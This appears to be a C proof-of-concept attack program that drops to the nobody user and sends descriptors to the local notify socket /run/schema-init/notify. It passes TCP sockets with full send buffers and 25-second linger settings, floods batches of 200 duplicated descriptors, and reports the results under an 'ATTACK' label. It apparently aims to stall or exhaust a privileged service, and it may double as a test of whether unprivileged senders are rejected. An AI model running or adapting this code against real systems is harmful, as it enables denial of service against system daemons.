#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <grp.h>
#include <net/if.h>
#include <netinet/in.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <unistd.h>
static struct sockaddr_un dst = { .sun_family = AF_UNIX, .sun_path = "/run/schema-init/notify" };
static int sendfds(const int *fds, int n) {
    char cb[CMSG_SPACE(sizeof(int) * 253)];
    struct iovec iov = { "X=1", 3 };
    struct msghdr mh = { .msg_name = &dst, .msg_namelen = sizeof dst, .msg_iov = &iov, .msg_iovlen = 1,
                         .msg_control = cb, .msg_controllen = CMSG_SPACE(sizeof(int) * n) };
    struct cmsghdr *c = CMSG_FIRSTHDR(&mh);
    c->cmsg_level = SOL_SOCKET; c->cmsg_type = SCM_RIGHTS; c->cmsg_len = CMSG_LEN(sizeof(int) * n);
    memcpy(CMSG_DATA(c), fds, sizeof(int) * n);
    return sendmsg(socket(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC, 0), &mh, 0) < 0 ? errno : 0;
}
int main(void) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr = { 0 };
    strcpy(ifr.ifr_name, "lo");
    ioctl(s, SIOCGIFFLAGS, &ifr); ifr.ifr_flags |= IFF_UP; ioctl(s, SIOCSIFFLAGS, &ifr);
    struct sockaddr_in a = { .sin_family = AF_INET, .sin_addr.s_addr = htonl(INADDR_LOOPBACK) };
    socklen_t al = sizeof a;
    int small = 4096, lsn = socket(AF_INET, SOCK_STREAM, 0);
    setsockopt(lsn, SOL_SOCKET, SO_RCVBUF, &small, sizeof small);
    bind(lsn, (struct sockaddr *)&a, sizeof a); listen(lsn, 128); getsockname(lsn, (struct sockaddr *)&a, &al);
    setgroups(0, NULL); setresgid(65534, 65534, 65534); setresuid(65534, 65534, 65534);
    sleep(3);
    int ok = 0, eperm = 0, other = 0;
    char junk[4096]; memset(junk, 'x', sizeof junk);
    for (int i = 0; i < 33; i++) {
        int c = socket(AF_INET, SOCK_STREAM, 0);
        setsockopt(c, SOL_SOCKET, SO_SNDBUF, &small, sizeof small);
        if (connect(c, (struct sockaddr *)&a, sizeof a) < 0) { other++; close(c); continue; }
        fcntl(c, F_SETFL, O_NONBLOCK);
        while (write(c, junk, sizeof junk) > 0) {}
        fcntl(c, F_SETFL, 0);
        struct linger lg = { 1, 25 };
        setsockopt(c, SOL_SOCKET, SO_LINGER, &lg, sizeof lg);
        int r = sendfds(&c, 1);
        r == 0 ? ok++ : r == EPERM ? eperm++ : other++;
        close(c);
        usleep(20000);
    }
    int nul = open("/dev/null", O_RDONLY), many[200];
    for (int m = 0; m < 5; m++) {
        for (int i = 0; i < 200; i++) many[i] = dup(nul);
        int r = sendfds(many, 200);
        r == 0 ? ok++ : r == EPERM ? eperm++ : other++;
        for (int i = 0; i < 200; i++) close(many[i]);
        usleep(20000);
    }
    printf("ATTACK as uid %d: msgs ok=%d eperm=%d other=%d\n", (int)getuid(), ok, eperm, other);
    fflush(stdout);
    for (;;) pause();
}
